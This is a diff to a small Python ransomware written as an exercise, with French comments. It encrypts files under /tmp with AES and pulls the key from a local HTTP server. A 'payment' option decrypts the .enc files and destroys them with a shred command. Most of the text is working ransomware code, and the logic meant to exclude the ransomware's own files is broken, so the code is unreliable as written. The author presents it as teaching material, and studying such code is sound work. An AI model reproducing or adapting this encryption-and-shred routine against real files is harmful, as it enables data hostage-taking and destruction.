@@ -14,7 +14,7 @@ from Crypto.Cipher import AES
 
 Exercice de création d'un ransomware simple en python
 
-Le programme n'a pas une vocation réaliste cf: les nombreuses exceptions gerées, le systeme de dechiffrement etc
+Le programme n'a pas une vocation réaliste cf: les nombreuses exceptions gerées, le systeme de dechiffrement, l'accés au site etc
 
 
 
@@ -27,10 +27,15 @@ Le programme n'a pas une vocation réaliste cf: les nombreuses exceptions gerée
 #On ajoute un padding sur les données à chiffrer pour remplir tous les blocs pour l'AES
 #Pour ne pas crééer de confusion lors du dechiffrement, on s'assure que le padding est different du dernier charactere (probleme revelé lors du chiffrement de fichier binaire)
 def pad(s):
-	if s[len(s) - 1 ] != b"0":
-		return s + b"0" * (AES.block_size - len(s) % AES.block_size)
-	else :
-		return s + b"1" * (AES.block_size - len(s) % AES.block_size)
+	try:
+
+		if s[len(s) - 1 ] != b"0":
+			return s + b"0" * (AES.block_size - len(s) % AES.block_size)
+		else :
+			return s + b"1" * (AES.block_size - len(s) % AES.block_size)
+		return 0
+	except IndexError:
+		return 0
 
 
 
@@ -53,7 +58,7 @@ def genereaes(key):
 
 def getfiles():
 
-	# Recuperation des noms de fichier dans tmp
+	# Recuperation des noms de fichier avec leur chemin absolu dans tmp
 
 	try:
 		files = list()
@@ -84,7 +89,8 @@ def chiffre():
 
 	#ouverture des fichiers
 	for file in files:
-		if file !="/tmp/test/Execme.py":
+		#on ajoute des exceptions pour pas que les composants du ransomware soient chiffrés.
+		if file != ("/tmp/Execme.py" or "/tmp/serveur.py" or "/tmp/requirement.txt" or "/tmp/README.md"):
 
 			try:
 
@@ -97,10 +103,11 @@ def chiffre():
 				content = pad(content)
 
 				try:
+					#on chiffre le fichier
 					d = cipher.encrypt(content)
 				except:
 					print("probleme lors du chiffrement")
-
+				#on ecrit le fichier chiffré
 				fenc = open(file+".enc", "wb")
 				fenc.write(d)
 				fenc.close()
@@ -114,7 +121,7 @@ def dechiffre():
 	key = getkey()
 
 
-
+	#on recupere les fichiers qui ont été chiffrés
 	files = getfiles()
 	files = [x for x in files if  x.endswith(".enc")]
 	
@@ -131,6 +138,7 @@ def dechiffre():
 		os.system("shred -vzu "+ file+" >/dev/null 2>&1")
 
 		try:
+			#dechiffrement des données du fichier
 			d = cipher.decrypt(content)
 		except:
 			print("probleme lors du dechiffrement")
@@ -140,7 +148,7 @@ def dechiffre():
 			d = d.rstrip(b"0")
 		else:
 			d = d.rstrip(b"1")
-		fenc = open(file.replace(".enc",""), "wb")
+		fenc = open(file.replace(".enc",""), "wb") #on ecrit notre fichier clair sans l'extension
 		fenc.write(d)
 		fenc.close()
 
@@ -150,15 +158,16 @@ def dechiffre():
 
 def getkey():
 	try:
-		r = requests.get('http://127.0.0.1:8080/cle.txt') #Le ransomware va chercher la clé sur le serveur et l'obtient en format json
+		r = requests.get('http://127.0.0.1:6666/cle.txt') #Le ransomware va chercher la clé sur le serveur et l'obtient en format json
 		key = ((r.text).split(":"))[1]
-		key = binascii.unhexlify(key)
+		key = binascii.unhexlify(key)   #la cle est recuperé sur le serveur en hexadecimal et converti en binaire pour etre donnée à l'AES
 		return key
 
 
-	except ConnectionError:
+	except ConnectionError: #le serveur est injoignable
 		print("le serveur est injoignable | pour subir le ransomware, executez le programme serveur.py\n et laissez le ouvert pendant toute l'operation de chiffrement et dechiffrement\n\n")
-		return key
+		print("!! Attention, la clé est aleatoire, ne fermez pas le serveur si vos données sont chiffrés !!\n")
+		sys.exit()
 
 
 
@@ -170,13 +179,14 @@ def getkey():
 def main(argv,argc):
 	try:
 		opts, args = getopt.getopt(argv[1:],'p') #Si pas d'options, on chiffre
-
+	#l'option n'est pas reconnue
 	except getopt.GetoptError:
 		print("option invalide")
 		sys.exit()
 
 	for opt,arg in opts:
 		if opt in ('-p'):
+			#si l'option p est detectée, on active le dechiffrement
 			print("paiement du ransomware")
 
 			print(""" 
